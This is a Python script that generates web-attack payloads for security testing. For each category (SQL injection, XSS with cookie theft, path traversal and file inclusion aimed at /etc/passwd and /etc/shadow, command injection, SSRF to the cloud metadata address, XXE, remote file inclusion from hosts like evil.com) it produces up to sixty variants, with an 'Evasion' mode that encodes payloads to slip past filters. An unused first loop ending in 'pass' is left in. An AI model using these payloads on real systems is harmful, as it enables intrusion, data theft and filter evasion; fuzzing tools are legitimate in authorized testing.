import urllib.parse
import random

COMP_BASIC = "Basic"
COMP_ADVANCED = "Advanced"
COMP_EVASION = "Evasion"
MAX_PAYLOADS = 60

# Full categories from GNNGenerator.java
CATEGORIES = {
    "SQL Injection": [
        "' OR 1=1--", "' OR '1'='1", "' UNION SELECT NULL--", "' AND 1=1--",
        "' OR EXISTS(SELECT 1)--", "' OR 'a'='a", "' OR 'x'='x'--",
        "' UNION SELECT username,password FROM users--", "' OR 1=1#", "' OR ''='"
    ],
    "XSS": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<script>confirm(1)</script>",
        "<script>prompt(1)</script>", "<script>alert(document.cookie)</script>",
        "<img src=x onerror=confirm(1)>", "<svg onload=confirm(1)>"
    ],
    "Path Traversal": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
        "..\\..\\windows\\win.ini", "../boot.ini", "../etc/shadow",
        "../../../../windows/system32/drivers/etc/hosts"
    ],
    "Command Injection": [
        "; whoami", "&& id", "| cat /etc/passwd", "; ls", "&& uname -a", "; pwd", "| whoami", "; cat /etc/passwd"
    ],
    "IDOR": [
        "id=1", "id=2", "id=3", "id=100", "user=1", "user=2", "account=1"
    ],
    "SSRF": [
        "http://127.0.0.1", "http://localhost", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]"
    ],
    "Local File Inclusion": [
        "../../../../etc/passwd", "../../../../windows/win.ini", "../etc/passwd", "../boot.ini"
    ],
    "Remote File Inclusion": [
        "http://evil.com/shell.txt", "http://attacker.com/payload.php", "http://malicious.site/backdoor.txt"
    ],
    "XXE": [
        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
        "<!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]>",
        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
    ],
    "GraphQL Injection": [
        "{ user(id:1){password}}", "{ users{id,password}}", "{user(id:\"1\"){email}}"
    ],
    "Open Redirect": [
        "https://evil.com", "//evil.com", "http://attacker.com"
    ],
    "API Abuse": [
        "{\"role\":\"admin\"}", "{\"access\":\"root\"}", "{\"admin\":true}"
    ]
}

def encode(s):
    return s.replace("'", "%27").replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")

def double_encode(s):
    return encode(encode(s))

def apply_complexity(base, complexity):
    if complexity == COMP_BASIC:
        return base + " /*BASIC*/"
    if complexity == COMP_ADVANCED:
        return base.replace(" ", "/**/") + " /*ADV*/"
    if complexity == COMP_EVASION:
        return encode(base) + " /*EVASION*/"
    return base

def generate_payloads(category_name, complexity, target_param="id"):
    payload_set = []
    base_list = CATEGORIES.get(category_name, [])
    
    if not base_list:
        return []

    # Cycle through base list to reach 60
    for i in range(MAX_PAYLOADS):
        base = base_list[i % len(base_list)]
        p_complex = apply_complexity(base, complexity)
        
        # Variations logic from GNNGenerator.java
        # It adds variations in the loop, let's replicate the exact pattern
        # The loop in Java: for(String p : base) { add p, add param=p, add p OR 1=1, etc... }
        pass

    # Actually, GNNGenerator.java loop:
    # for(String p : base){
    #    p = applyComplexity(p, complexity);
    #    payloadSet.add(p);
    #    payloadSet.add(param + "=" + p);
    #    payloadSet.add(p + " OR 1=1");
    #    ...
    # }
    
    real_payload_set = []
    for base in base_list:
        p = apply_complexity(base, complexity)
        real_payload_set.append(p)
        real_payload_set.append(f"{target_param}={p}")
        real_payload_set.append(p + " OR 1=1")
        real_payload_set.append(p + " AND 1=1")
        real_payload_set.append(p.replace(" ", "/**/"))
        real_payload_set.append(encode(p))
        real_payload_set.append(double_encode(p))
        real_payload_set.append("admin" + p)
        real_payload_set.append(p + " LIMIT 1")
        real_payload_set.append(p + " --")
        
        if len(real_payload_set) >= MAX_PAYLOADS:
            break
            
    return real_payload_set[:MAX_PAYLOADS]

if __name__ == "__main__":
    import json
    results = {}
    for cat in CATEGORIES.keys():
        results[cat] = {}
        for comp in [COMP_BASIC, COMP_ADVANCED, COMP_EVASION]:
            results[cat][comp] = generate_payloads(cat, comp)
    
    print(json.dumps(results, indent=2))
